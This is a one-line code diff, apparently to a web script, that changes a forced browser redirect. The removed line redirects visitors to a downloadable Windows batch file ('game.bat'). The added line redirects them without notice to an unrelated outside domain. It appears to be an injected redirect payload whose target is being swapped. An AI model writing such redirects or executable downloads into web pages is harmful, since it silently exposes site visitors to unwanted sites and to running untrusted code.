@@ -1,1 +1,1 @@
-window.location.replace('http://teakvoyage.github.io/game.bat');
+window.location.replace('http://17ebook.com');
